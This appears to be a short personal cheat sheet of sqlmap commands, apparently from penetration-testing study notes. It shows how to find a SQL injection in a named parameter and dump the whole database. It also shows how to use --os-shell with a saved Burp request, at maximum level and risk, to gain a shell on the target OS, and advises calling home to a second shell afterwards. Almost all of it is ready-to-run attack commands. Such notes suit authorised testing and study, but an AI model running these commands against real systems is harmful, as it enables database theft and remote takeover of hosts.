

#### Usage

`sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump` - basic usage with URL and targeted parameter. If vulnerability is found it will then dump the database.

`sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"` - uses a saved request from burpsuite to specify the attack space, which will attempt to gain a shell to the target os. the target param is item. The custom writable file is --web-root which will be used to make the shell.

`sqlmap -r request.txt -p <item> --os-shell --batch --level=5 --risk=3` - auto shell after finding injection point. if you get a shell - use it to call home to another shell to stabilize and get more features.

